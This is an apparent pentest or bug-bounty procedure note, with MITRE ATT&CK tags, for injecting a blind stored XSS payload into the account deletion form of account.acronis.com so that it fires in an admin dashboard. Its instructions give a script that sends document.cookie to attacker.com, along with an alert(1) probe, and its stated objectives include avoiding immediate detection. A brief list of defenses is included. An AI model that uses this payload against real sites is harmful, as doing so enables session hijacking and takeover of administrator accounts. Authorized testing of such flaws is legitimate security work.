---
tags:
  - xss
  - injection
  - web
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
techniques:
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
id: 80a81fb0-057b-4b57-a398-2d3b9d70463b
created_at: '2025-12-13T23:52:50.054Z'
updated_at: '2025-12-13T23:52:50.054Z'
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-XSS-Payload-into-Deletion-Form

## Summary

This procedure details the injection of a malicious JavaScript payload into the account deletion form on account.acronis.com, exploiting lack of sanitization to store the payload for later execution.

## Description

The attack scenario targets the deletion process where user input is stored in backend logs or queues for admin approval. Without proper escaping, the payload persists and executes when rendered in the admin dashboard. Prerequisites include a test account; outcomes enable blind XSS confirmation.

## Requirements

1. Access to the deletion form from Step 1
2. Knowledge of XSS payloads (e.g., for blind testing)
3. Optional: Proxy tool like Burp Suite to intercept and modify requests

## Defense

Defensive measures and detection strategies:

- Sanitize and encode all user inputs using HTML entity encoding
- Validate input length and content on submission
- Implement web application firewall (WAF) rules to block common XSS patterns

## Objectives

1. Deliver payload via form submission
2. Ensure storage without immediate detection
3. Set up for admin-side execution

## Instructions

### Step 1: Craft Payload

**Context**: Select a blind XSS payload that executes on load, such as an onerror handler.

Prepare payload: `<script>fetch('https://attacker.com/log?cookie='+document.cookie)</script>` or simple `<img src=x onerror=alert(1)>`.

> This payload is designed to exfiltrate data silently when triggered.

### Step 2: Submit Form with Payload

**Context**: Enter the payload in the vulnerable field and complete deletion.

In the form's text area (e.g., reason field), paste the payload and submit.

> Submission succeeds; payload is stored backend-side, confirming blind injection.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[injection]]
- [[web]]
